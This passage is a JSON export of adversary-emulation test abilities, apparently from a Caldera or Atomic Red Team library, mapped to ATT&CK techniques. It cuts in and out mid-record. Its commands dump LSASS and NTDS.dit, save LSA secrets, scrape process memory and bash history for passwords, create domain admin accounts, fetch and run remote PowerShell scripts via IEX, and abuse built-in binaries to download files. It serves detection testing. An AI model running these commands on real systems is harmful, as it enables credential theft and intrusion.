{}, "singleton": false, "description": "Attackers who have permissions, can run malicious commands in containers in the cluster using exec command (\u201cdocker exec\u201d). In this method, attackers can use legitimate images, such as an OS image (e.g., Ubuntu) as a backdoor container, and run their malicious code remotely by using \u201cdocker exec\u201d. Kinsing (Golang-based malware) was executed with an Ubuntu container entry point that runs shell scripts.\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["docker stop t1609_container; docker rmi -f t1609:latest"], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "docker build -t t1609  $PathtoAtomicsFolder/T1609/src/ ; docker run --name t1609_container --rm -itd t1609 bash /tmp/script.sh; docker exec -i t1609_container bash -c \"cat /tmp/output.txt\"", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Kubernetes Exec Into Container", "ability_id": "2b7b8128c448ccaedfa1618498884296", "technique_id": "T1609", "tactic": "execution", "requirements": [], "name": "Docker Exec Into Container", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Create a random atr-nnnnnnnn account and add it to a domain group (by default, Domain Admins). \n\nThe quickest way to run it is against a domain controller, using `-Session` of `Invoke-AtomicTest`. Alternatively,\nyou need to install PS Module ActiveDirectory (in prereqs) and run the script with appropriare AD privileges to \ncreate the user and alter the group. Automatic installation of the dependency requires an elevated session, \nand is unlikely to work with Powershell Core (untested).\n\nIf you consider running this test against a production Active Directory, the good practise is to create a dedicated\nservice account whose delegation is given onto a dedicated OU for user creation and deletion, as well as delegated\nas group manager of the target group.\n\nExample: `Invoke-AtomicTest -Session $session 'T1098' -TestNames \"Domain Account and Group Manipulate\" -InputArgs @{\"group\" = \"DNSAdmins\" }`\n", "repeatable": false, "privilege": "", "buckets": ["persistence"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Get-ADUser -LDAPFilter \"(&(samaccountname=atr--*)(givenName=Test))\" | Remove-ADUser -Confirm:$False"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Try {;     Import-Module ActiveDirectory -ErrorAction Stop | Out-Null;      ; } ; Catch {;     if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {;   Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online; } else {;   Install-WindowsFeature RSAT-AD-PowerShell; }; };  ;  $x = Get-Random -Minimum 2 -Maximum 99; $y = Get-Random -Minimum 2 -Maximum 99; $z = Get-Random -Minimum 2 -Maximum 99; $w = Get-Random -Minimum 2 -Maximum 99; Import-Module ActiveDirectory; $account = \"#{account_prefix}-$x$y$z\"; New-ADUser -Name $account -GivenName \"Test\" -DisplayName $account -SamAccountName $account -Surname $account -Enabled:$False; Add-ADGroupMember \"#{group}\" $account", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Account Manipulation", "ability_id": "b3aef1cccb10fc2ecf00bc80646ef8fe", "technique_id": "T1098", "tactic": "persistence", "requirements": [], "name": "Domain Account and Group Manipulate", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This atomic test downloads a macro enabled document from the Atomic Red Team GitHub repository, simulating an end user clicking a phishing link to download the file.\nThe file \"PhishingAttachment.xlsm\" is downloaded to the %temp% directory.\n", "repeatable": false, "privilege": "", "buckets": ["initial-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item $env:TEMP\\PhishingAttachment.xlsm -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri $url -OutFile $env:TEMP\\PhishingAttachment.xlsm", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Phishing: Spearphishing Attachment", "ability_id": "1afaec09315ab71fdfb167175e8a019a", "technique_id": "T1566.001", "tactic": "initial-access", "requirements": [], "name": "Download Macro-Enabled Phishing Attachment", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Uses Windows Defender MpCmdRun.exe to download a file from the internet (must have version 4.18 installed).\nThe input arguments \"remote_file\" and \"local_path\" can be used to specify the download URL and the name of the output file.\nBy default, the test downloads the Atomic Red Team license file to the temp directory.\n\nMore info and how to find your version can be found here https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del %temp%\\Atomic-license.txt >nul 2>&1 && del %temp%\\MpCmdRun.log >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "cd \"%ProgramData%\\Microsoft\\Windows Defender\\platform\\4.18*\" && MpCmdRun.exe -DownloadFile -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path %temp%\\Atomic-license.txt", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Ingress Tool Transfer", "ability_id": "15d7ca52df3177e60fbd8a9c8ab66719", "technique_id": "T1105", "tactic": "command-and-control", "requirements": [], "name": "Download a File with Windows Defender MpCmdRun.exe", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use wscript to run a local VisualBasic file to download a remote file", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["bf591b_T1105-download-file.vbs"], "parsers": [], "cleanup": ["del Atomic-License.txt >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "wscript.exe bf591b_T1105-download-file.vbs", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Ingress Tool Transfer", "ability_id": "a43fdf7e96a3485431f079491056766c", "technique_id": "T1105", "tactic": "command-and-control", "requirements": [], "name": "Download a file using wscript", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use IMEWDBLD.exe (built-in to windows) to download a file. This will throw an error for an invalid dictionary file.\nDownloaded files can be found in \"%LocalAppData%\\Microsoft\\Windows\\INetCache\\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>\" or `%LocalAppData%\\Microsoft\\Windows\\INetCache\\IE\\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>.\nRun \"Get-ChildItem -Path C:\\Users\\<USERNAME>\\AppData\\Local\\Microsoft\\Windows\\INetCache\\ -Include <FILENAME>* -Recurse -Force -File -ErrorAction SilentlyContinue\" without quotes and adding the correct username and file name to locate the file.\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["$inetcache = $env:LOCALAPPDATA + \"\\Microsoft\\Windows\\INetCache\\\" ; $file_to_be_removed = [string[]] (Get-ChildItem -Path $inetcache -Include T1105* -Recurse -Force -File -ErrorAction SilentlyContinue); if(\"\" -ne \"$file_to_be_removed\") { Remove-Item \"$file_to_be_removed\" -ErrorAction Ignore }"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$imewdbled = $env:SystemRoot + \"\\System32\\IME\\SHARED\\IMEWDBLD.exe\"; & $imewdbled https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Ingress Tool Transfer", "ability_id": "04d33ddae0126966ae6d841267c17329", "technique_id": "T1105", "tactic": "command-and-control", "requirements": [], "name": "Download a file with IMEWDBLD.exe", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Uses the cmdl32 to download arbitrary file from the internet. The cmdl32 package is allowed to install the profile used to launch the VPN connection. However, the config is modified to download the arbitary file. \nThe issue of cmdl32.exe detecting and deleting the payload by identifying it as not a VPN Servers profile is avoided by setting a temporary TMP folder and denying the delete permission to all files for the user.\nUpon successful execution the test will open calculator and Notepad executable for 10 seconds.\nreference:\nhttps://twitter.com/ElliotKillick/status/1455897435063074824\nhttps://github.com/LOLBAS-Project/LOLBAS/pull/151\nhttps://lolbas-project.github.io/lolbas/Binaries/Cmdl32/\nhttps://strontic.github.io/xcyclopedia/library/cmdl32.exe-FA1D5B8802FFF4A85B6F52A52C871BBB.html\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["821ca9_T1105.bat"], "parsers": [], "cleanup": ["del /f/s/q %temp%\\T1105 >nul 2>&1 && rmdir /s/q %temp%\\T1105 >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "821ca9_T1105.bat 1>NUL", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Ingress Tool Transfer", "ability_id": "552e8cf1f7fdc83d9ecf2c1bf22cf51a", "technique_id": "T1105", "tactic": "command-and-control", "requirements": [], "name": "Download a file with Microsoft Connection Manager Auto-Download", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped using NTDSUtil for offline credential theft attacks. This capability\nuses the \"IFM\" or \"Install From Media\" backup functionality that allows Active Directory restoration or installation of\nsubsequent domain controllers without the need of network-based replication.\n\nUpon successful completion, you will find a copy of the ntds.dit file in the C:\\Windows\\Temp directory.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rmdir /q /s C:\\Windows\\Temp\\ntds_T1003 >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "mkdir C:\\Windows\\Temp\\ntds_T1003 && ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\Windows\\Temp\\ntds_T1003\" q q", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping: NTDS", "ability_id": "df3a85f892f81ee118bee2a49141710a", "technique_id": "T1003.003", "tactic": "credential-access", "requirements": [], "name": "Dump Active Directory Database with NTDSUtil", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test executes the exported function `KRShowKeyMgr` located in `keymgr.dll` using `rundll32.exe`. It opens a window that allows to export stored Windows credentials from the credential manager to a file (`.crd` by default). The file can then be retrieved and imported on an attacker-controlled computer to list the credentials get the passwords. The only limitation is that it requires a CTRL+ALT+DELETE input from the attacker, which can be achieve multiple ways (e.g. a custom implant with remote control capabilities, enabling RDP, etc.).\nReference: https://twitter.com/0gtweet/status/1415671356239216653", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "rundll32.exe keymgr,KRShowKeyMgr", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping", "ability_id": "8de14c0ea1b80dbd5de0cf5d28cff16b", "technique_id": "T1003", "tactic": "credential-access", "requirements": [], "name": "Dump Credential Manager using keymgr.dll and rundll32.exe", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use createdump executable from .NET to create an LSASS dump.\n\n[Reference](https://twitter.com/bopin2020/status/1366400799199272960?s=20)\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item $env:Temp\\dotnet-lsass.dmp -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$exePath =  resolve-path \"$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\"; & \"$exePath\" -u -f $env:Temp\\dotnet-lsass.dmp (Get-Process lsass).id", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping: LSASS Memory", "ability_id": "a8911b689872a0b7060bc920440d2647", "technique_id": "T1003.001", "tactic": "credential-access", "requirements": [], "name": "Dump LSASS with createdump.exe from .Net v5", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The NanoDump tool uses syscalls and an invalid dump signature to avoid detection.\n\nhttps://github.com/helpsystems/nanodump\n\nUpon successful execution, you should find the nanondump.dmp file in the temp directory\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del \"%temp%\\nanodump.dmp\" >nul 2> nul"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "%temp%\\nanodump.x64.exe -w \"%temp%\\nanodump.dmp\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping: LSASS Memory", "ability_id": "0501437f74ad9350b96fdaf64d0fb6c7", "technique_id": "T1003.001", "tactic": "credential-access", "requirements": [], "name": "Dump LSASS.exe Memory using NanoDump", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This test leverages a pure\npowershell implementation that leverages the MiniDumpWriteDump Win32 API call.\nUpon successful execution, you should see the following file created $env:SYSTEMROOT\\System32\\lsass_*.dmp.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item $env:TEMP\\lsass_*.dmp -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1'); get-process lsass | Out-Minidump", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping: LSASS Memory", "ability_id": "0310c8a2dcab1e2bdfadf004c1141da8", "technique_id": "T1003.001", "tactic": "credential-access", "requirements": [], "name": "Dump LSASS.exe Memory using Out-Minidump.ps1", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals\nProcDump.\n\nUpon successful execution, you should see the following file created c:\\windows\\temp\\lsass_dump.dmp.\n\nIf you see a message saying \"procdump.exe is not recognized as an internal or external command\", try using the  get-prereq_commands to download and install the ProcDump tool first.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del \"C:\\Windows\\Temp\\lsass_dump.dmp\" >nul 2> nul"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "PathToAtomicsFolder\\T1003.001\\bin\\procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping: LSASS Memory", "ability_id": "ecb6d616a6566411dc36a6510904b0ba", "technique_id": "T1003.001", "tactic": "credential-access", "requirements": [], "name": "Dump LSASS.exe Memory using ProcDump", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with a built-in dll.\n\nUpon successful execution, you should see the following file created $env:TEMP\\lsass-comsvcs.dmp.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item $env:TEMP\\lsass-comsvcs.dmp -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp full", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping: LSASS Memory", "ability_id": "35d92515122effdd73801c6ac3021da7", "technique_id": "T1003.001", "tactic": "credential-access", "requirements": [], "name": "Dump LSASS.exe Memory using comsvcs.dll", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved using direct system calls and API unhooking in an effort to avoid detection. \nhttps://github.com/outflanknl/Dumpert\nhttps://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/\nUpon successful execution, you should see the following file created C:\\\\windows\\\\temp\\\\dumpert.dmp.\n\nIf you see a message saying \\\"The system cannot find the path specified.\\\", try using the  get-prereq_commands to download the  tool first.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del C:\\windows\\temp\\dumpert.dmp >nul 2> nul"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "PathToAtomicsFolder\\T1003.001\\bin\\Outflank-Dumpert.exe", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping: LSASS Memory", "ability_id": "16dfb3bfff123ed3be652367df062c61", "technique_id": "T1003.001", "tactic": "credential-access", "requirements": [], "name": "Dump LSASS.exe Memory using direct system calls and API unhooking", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved by\nimporting built-in DLLs and calling exported functions. Xordump will re-read the resulting minidump \nfile and delete it immediately to avoid brittle EDR detections that signature lsass minidump files.\n\nUpon successful execution, you should see the following file created $env:TEMP\\lsass-xordump.t1003.001.dmp.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item C:\\Windows\\Temp\\lsass-xordump.t1003.001.dmp -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "if (Test-Path 'C:\\Windows\\Temp\\xordump.exe') { ; } else {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest \"https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe\" -OutFile C:\\Windows\\Temp\\xordump.exe};  ;  C:\\Windows\\Temp\\xordump.exe -out C:\\Windows\\Temp\\lsass-xordump.t1003.001.dmp -x 0x41", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping: LSASS Memory", "ability_id": "36fc42ced381416ca7d5d7af0ee0561b", "technique_id": "T1003.001", "tactic": "credential-access", "requirements": [], "name": "Dump LSASS.exe using imported Microsoft DLLs", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This module will extract the credentials from Windows Credential Manager", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Credentials from Password Stores", "ability_id": "9d0478981edda6091f911a1305025bde", "technique_id": "T1555", "tactic": "credential-access", "requirements": [], "name": "Dump credentials from Windows Credential Manager With PowerShell [web Credentials]", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This module will extract the credentials from Windows Credential Manager", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Credentials from Password Stores", "ability_id": "d74777514cba5a4fd4f297261ed0d8ef", "technique_id": "T1555", "tactic": "credential-access", "requirements": [], "name": "Dump credentials from Windows Credential Manager With PowerShell [windows Credentials]", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Get contents of bash history", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.ssh", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "remote.ssh.cmd"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "find ~/.bash_sessions -name '*' -exec cat {} \\; 2>/dev/null", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.ssh", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "remote.ssh.cmd"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "cat ~/.bash_history", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Unsecured Credentials: Bash History", "ability_id": "422526ec-27e9-429a-995b-c686a29561a4", "technique_id": "T1552.003", "tactic": "credential-access", "requirements": [], "name": "Dump history", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Using `/proc/$PID/mem`, where $PID is the target process ID, use a Python script to\ncopy a process's heap memory to an external file so it can be searched or exfiltrated later.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["05c7d6_dump_heap.py"], "parsers": [], "cleanup": ["rm -f \"/tmp/T1003.007.bin\""], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "sh /tmp/T1003.007.sh; PID=$(pgrep -n -f \"T1003.007\"); PYTHON=$(which python || which python3 || which python2); $PYTHON 05c7d6_dump_heap.py $PID /tmp/T1003.007.bin; grep -i \"PASS\" \"/tmp/T1003.007.bin\"", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping: Proc Filesystem", "ability_id": "3a27f7828503c255275fa014464fb815", "technique_id": "T1003.007", "tactic": "credential-access", "requirements": [], "name": "Dump individual process memory with Python (Local)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Using `/proc/$PID/mem`, where $PID is the target process ID, use shell utilities to\ncopy process memory to an external file so it can be searched or exfiltrated later.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -f \"/tmp/T1003.007.bin\""], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "sh /tmp/T1003.007.sh; PID=$(pgrep -n -f \"T1003.007\"); HEAP_MEM=$(grep -E \"^[0-9a-f-]* r\" /proc/\"$PID\"/maps | grep heap | cut -d' ' -f 1); MEM_START=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f1)))); MEM_STOP=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f2)))); MEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START))); dd if=/proc/\"${PID}\"/mem of=\"/tmp/T1003.007.bin\" ibs=1 skip=\"$MEM_START\" count=\"$MEM_SIZE\"; grep -i \"PASS\" \"/tmp/T1003.007.bin\"", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping: Proc Filesystem", "ability_id": "2966a5fc825f509f4adff7b855e26574", "technique_id": "T1003.007", "tactic": "credential-access", "requirements": [], "name": "Dump individual process memory with sh (Local)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The svchost.exe contains the RDP plain-text credentials.\nSource: https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/\n\nUpon successful execution, you should see the following file created $env:TEMP\\svchost-exe.dmp.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item $env:TEMP\\svchost-exe.dmp -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore); if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }; C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump $id $env:TEMP\\svchost-exe.dmp full", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping", "ability_id": "18f31c311ac208802e88ab8d5af8603e", "technique_id": "T1003", "tactic": "credential-access", "requirements": [], "name": "Dump svchost.exe to gather RDP credentials", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Dump secrets key from Windows registry\nWhen successful, the dumped file will be written to $env:Temp\\secrets.\nAttackers may use the secrets key to assist with extracting passwords and enumerating other sensitive system information.\nhttps://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/#:~:text=LSA%20Secrets%20is%20a%20registry,host%2C%20local%20security%20policy%20etc.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del %temp%\\secrets >nul 2> nul"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "PathToAtomicsFolder\\T1003.004\\bin\\PsExec.exe -accepteula -s reg save HKLM\\security\\policy\\secrets %temp%\\secrets /y", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping: LSA Secrets", "ability_id": "adbbf2ebad58d40cb7260e0cb42e5093", "technique_id": "T1003.004", "tactic": "credential-access", "requirements": [], "name": "Dumping LSA Secrets", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "injects a dylib that opens calculator via env variable\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["kill `pgrep Calculator`; kill `pgrep firefox`"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "DYLD_INSERT_LIBRARIES=/tmp/T1574006MOS.dylib /Applications/Firefox.app/Contents/MacOS/firefox", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Hijack Execution Flow: LD_PRELOAD", "ability_id": "552764b3178c11896543fea2c7117f87", "technique_id": "T1574.006", "tactic": "multiple", "requirements": [], "name": "Dylib Injection via DYLD_INSERT_LIBRARIES", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "When C# is compiled dynamically, a .cmdline file will be created as a part of the process. \nCertain processes are not typically observed compiling C# code, but can do so without touching disk. This can be used to unpack a payload for execution.\nThe exe file that will be executed is named as T1027.004_DynamicCompile.exe is containted in the 'bin' folder of this atomic, and the source code to the file is in the 'src' folder.\nUpon execution, the exe will print 'T1027.004 Dynamic Compile'.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["893687_T1027.004_DynamicCompile.exe"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Invoke-Expression 893687_T1027.004_DynamicCompile.exe", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Obfuscated Files or Information: Compile After Delivery", "ability_id": "238fac804625c68206069fbec5cbf49c", "technique_id": "T1027.004", "tactic": "defense-evasion", "requirements": [], "name": "Dynamic C# Compile", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Edit the Uncomplicated Firewall (UFW) main configuration file for 